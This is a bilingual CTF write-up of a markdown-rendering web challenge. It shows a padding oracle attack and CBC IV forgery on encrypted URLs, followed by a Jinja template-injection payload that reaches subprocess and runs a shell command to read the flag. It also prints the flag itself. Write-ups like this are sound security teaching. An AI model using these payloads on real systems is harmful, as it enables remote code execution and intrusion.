# mark is falling down drunk (crypto/web)

## eng
[pl](#pl-version)

in the task we get a link for a webpage where someone deployed an application for parsing markdown.
there are a couple of example links.
we notice that the url is always the same, but the contains a long hex-string, which probably points to the actual page displayed.
if we modify the hex-string the page crashes or gives us `incorrect url` message.

this seems like a standard setup for padding oracle attack.
we assume that the hex-string is actually aes cbc encrypted data.
the first 16 bytes seems to indicate this even more because they are always `deadbeefcafedeadbeefcafe04030201` which seems like a nice iv.

so we run our padding oracle attack. 
for more in depth description of the attack refer to our previous writeups on this.
in short we exploit the fact that by manipulating value of previous ciphertext block we can influence the plaintext value or corresponding byte in the next block, directly from the cbc definition.
and if we accidentally set the last byte to `\01` then the decryption will not fail, since this is a proper padding.
we can then recover the real value of this last byte because we know that `ciphertext[k-1][n] xor decrypt(ciphertext[k][n])` is now `\01` and we know the value of `ciphertext[k-1][n]`.
we can then proceed to setting last 2 bytes to `\02\02` and so on to recover everything.

using our code from crypto commons with:

```python
import requests
from crypto_commons.symmetrical.symmetrical import oracle_padding_recovery

data = 'deadbeefcafedeadbeefcafe0403020131fdd089e91025df9510efa46b2085aac738ae5e03daa6495e2e4ee83283282a5be01dd6d817df2c0e69cd613c7da160a6aab9f02d175ac549feb6b674fa6f65'

print(oracle_padding_recovery(data, oracle))

# https://gitlab.com/gitlab-org/gitlab-ce/raw/master/readme.md
```

and we do the same for all the links.
there is a problem there, because for some reason we can't recover the first block.
the server was crashing when there was only one plaintext block.
but this was not really an issue, since the links were quite obvious and we could just guess the missing bytes.

the most interesting link was the one for their own example, which contained something like

```
{{ config['page'] }}
```

in the content, but when viewed with their markdown parser it was presenting an actual link.
this meant that we could evaluate templates if we can get a ciphertext for our own webpage.

this was a bit of an issue, since standard approach would be to change the iv so that first block of the plaintext decrypts to `http://our.page\01` and sending just the iv and this one block.

just as a reminder, we can do this since decryption of 1st block for cbc is `iv xor decrypt(ciphertext[0])`, and since we know the iv and we know the value of `decrypt(ciphertext[0])` we can simply set selected iv byte to: 
`newiv[k] = iv[k] xor plaintext[k] xor expected_value`

and the decryption will give us `expected_value` at `k-th` position.

in our scenario this would not work, because the single block payloads were failing (maybe admins fixed this later?).
anyway, we figured that we can also instead set the first block to: `http://our.page?` and leave the other blocks, because now the rest of some other url will be treated as get parameters and the link will work fine.

this way we got an example payload:

```python
data = 'deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf440d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02'.decode("hex")
old_iv = list(data[:16])
target_payload = list(pad("https://p4.team?"))
pt = "https://raw.githubusercontent.com/dlitz/pycrypto/master/readme\02\02"[:16]
new_iv = "".join([chr(ord(old_iv[i]) ^ ord(pt[i]) ^ ord(target_payload[i])) for i in range(16)])
payload = (new_iv + data[16:]).encode("hex")
print(payload)
```

and by passing this payload we can now load our markdown code on the server.

now we move to the template injection exploit.
we use a classic approach to do `''.__class__.__mro__[1].__subclasses__()` to get list of all subclasses of `object` loaded in python.
there was a small problem, because the `__something__` was actually interpreted as markdown and replaced by `<strong>something</strong>` so we had to put the payload in backticks to avoid this.

once we got a list of all classes we found the `catch_warnings` which we could exploit:

```
{% set loadedclasses = ''.__class__.__mro__[1].__subclasses__() %} 
{% for loadedclass in loadedclasses %} 
	{% if loadedclass.__name__ == 'catch_warnings' %} 
		{% set builtinsreference = loadedclass()._module.__builtins__ %} 
		{% set os = builtinsreference['__import__']('subprocess') %}
		{{ os.check_output('cat app/flag', shell=true) }}
	{% endif %} 
{% endfor %} 
```

and get the flag `ndh{edfba7f05f2d0a30f54b0820105cdab21f59b60a7d72f5c7b38c23db840d6cab}`

## pl version

w zadaniu dostajemy link do strony gdzie ktoś udostępnił swoją aplikacje do parsowania markdown.
jest tam kilka przykładowych linków.
zauważamy, że url jest zawsze taki sam, ale zawiera długi hex-string, który najpewniej opisuje własciwą stronę.
jeśli zmienimy ten hex-string to strona się wysypuje lub dostajemy `incorrect url`.

to wygląda jak standardowy setup dla ataku padding oracle.
zakładamy tu, że hex-string to w rzeczywistości szyfrogram aes cbc.
pierwsze 16 bajtów mocno to sugeruje bo to zawsze `deadbeefcafedeadbeefcafe04030201` co wygląda na jakieś iv.

uruchamiamy więc nasz padding oracle.
dla bardziej szczegółowego opisu tego ataku odsyłamy do naszych poprzednich writeupów na ten temat.
w skrócie wykorzystujemy tu fakt, że manipulując wartością poprzedniego bloku szyfrogramu możemy wpłynąć na deszyfrowanie odpowiedniego bajtu następnego bloku, bezpośrednio z definicji cbc.
jeśli przypadkowo zmienimy ostatni bajt na `\01` to deszyfrowanie nie zgłosi błędu, bo padding będzie poprawny.
możemy wtedy odkryć prawdziwą wartość tego ostatniego bajtu, bo wiemy, że `ciphertext[k-1][n] xor decrypt(ciphertext[k][n])` wynosi teraz `\01` a znamy wartość `ciphertext[k-1][n]`.
następnie możemy powtórzyć to samo, ale tym razem ustawiając dwa ostatnie bloki na `\02\02` itd aż odzyskamy całą odszyfrowaną wiadomość.

z użyciem naszego kodu z crypto commons:

```python
import requests
from crypto_commons.symmetrical.symmetrical import oracle_padding_recovery

data = 'deadbeefcafedeadbeefcafe0403020131fdd089e91025df9510efa46b2085aac738ae5e03daa6495e2e4ee83283282a5be01dd6d817df2c0e69cd613c7da160a6aab9f02d175ac549feb6b674fa6f65'

print(oracle_padding_recovery(data, oracle))

# https://gitlab.com/gitlab-org/gitlab-ce/raw/master/readme.md
```

i postępujemy tak samo dla wszystkich linków.
jest tam pewien problem, ponieważ nie możemy odzyskać 1 bloku.
serwer wysypuje się jeśli jest tylko 1 blok szyfrogramu.
to na szczęście nie stanowiło wielkiego problemu, bo linki były dość oczywiste i mogliśmy zgadnąć brakujace bajty.

najbardziej interesujący był link do przykładu od autorów zadania, który zawierał coś w stylu:

```
{{ config['page'] }}
```

w treści, podczas gdy na stronie po sparsowaniu markdown widniał faktyczny link.
to oznacza że można ewaluować szablony, jeśli tylko możemy przekazać tam własną stronę.

to stanowiło jednak początkowo problem, bo standardowe podejście to ustawić iv tak, zeby pierwszy blok odszyfrowanego tekstu deszyfrował się do `http://our.page\01` i wysłanie tylko nowego iv i tego jednego bloku.

dla przypomnienia, możemy tak zrobić, bo deszyfrowanie 1 bloku to `iv xor decrypt(ciphertext[0])` a skoro znamy iv i wiemy jaka jest wartość `decrypt(ciphertext[0])` to możemy ustawić wybrany bajt iv do:
`newiv[k] = iv[k] xor plaintext[k] xor expected_value`

a deszyfrowanie da nam `expected_value` na `k-tej` pozycji.

w naszym przypadku to nie mogło zadziałać, bo jeden blok szyfrogramu powodował błąd serwera (admini to później poprawili?).
tak czy siak, wymyśliliśmy jak ten problem obejść, przez ustawienie pierwszego bloku na `http://our.page?` i pozostawienie pozostałych bloków, ponieważ teraz ten pozostały fragment starego urla będzie potraktowany jako parametry get a nasz link zadziała poprawnie.

w ten sposób dostajemy szyfrogram:

```python
data = 'deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf440d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02'.decode("hex")
old_iv = list(data[:16])
target_payload = list(pad("https://p4.team?"))
pt = "https://raw.githubusercontent.com/dlitz/pycrypto/master/readme\02\02"[:16]
new_iv = "".join([chr(ord(old_iv[i]) ^ ord(pt[i]) ^ ord(target_payload[i])) for i in range(16)])
payload = (new_iv + data[16:]).encode("hex")
print(payload)
```

i przekazując do go strony możemy teraz ewaluować nasz własny kod mardown na serwerze.

teraz przechodzimy do template injection.
stosujemy tu dość standardowy zabieg `''.__class__.__mro__[1].__subclasses__()` aby pobrać listę podklas `object` załadowanych w pythonie.

tutaj mieliśmy przez chwilę problem bo `__cośtam__` było procesowane przez markdown i zamieniane na `<strong>cośtam</strong>`  więc musieliśmy kod objąć w backticki.

mając listę klas znaleźliśmy `catch_warnings` które można było wykorzystać:

```
{% set loadedclasses = ''.__class__.__mro__[1].__subclasses__() %} 
{% for loadedclass in loadedclasses %} 
	{% if loadedclass.__name__ == 'catch_warnings' %} 
		{% set builtinsreference = loadedclass()._module.__builtins__ %} 
		{% set os = builtinsreference['__import__']('subprocess') %}
		{{ os.check_output('cat app/flag', shell=true) }}
	{% endif %} 
{% endfor %} 
```

aby dostać flagę: `ndh{edfba7f05f2d0a30f54b0820105cdab21f59b60a7d72f5c7b38c23db840d6cab}`
